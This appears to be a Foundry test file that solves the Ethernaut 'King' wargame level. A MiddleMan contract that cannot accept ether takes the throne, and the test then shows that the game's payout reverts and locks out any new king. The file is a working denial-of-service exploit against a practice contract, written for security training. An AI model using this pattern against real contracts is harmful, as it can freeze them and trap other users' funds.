// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/King.sol";

contract MiddleMan {
    function attack(address prey) public payable {
        // do not use address.transfer() as it has only 2300 gas stipend
        // all logic in receive() except require() costs > 2300
        // payable(prey).transfer(msg.value);
        prey.call{value: msg.value}("");
    }
}

// write a contract that cannot receive ether transfer to block the new king
contract KingTest is Test {
    King instance;
    uint256 initialPrize = 0.001 ether;

    receive() external payable {}

    function setUp() public {
        instance = new King{value: initialPrize}();
    }

    function test() public {
        assertEq(instance.owner(), address(this));
        assertEq(instance.king(), address(this));
        assertEq(instance.prize(), initialPrize);
        assertEq(address(instance).balance, initialPrize);

        MiddleMan middleMan = new MiddleMan();
        middleMan.attack{value: initialPrize}(payable(address(instance)));

        assertEq(instance.king(), address(middleMan));
        assertEq(instance.owner(), address(this));
        assertEq(instance.prize(), initialPrize);

        vm.expectRevert();
        // ensure middleMan is called once for attempting transfer() but fails
        vm.expectCall(address(middleMan), bytes(""));
        // not using transfer() here for the same above reason
        address(instance).call{value: initialPrize}("");
        assertEq(address(middleMan).balance, 0);
    }
}
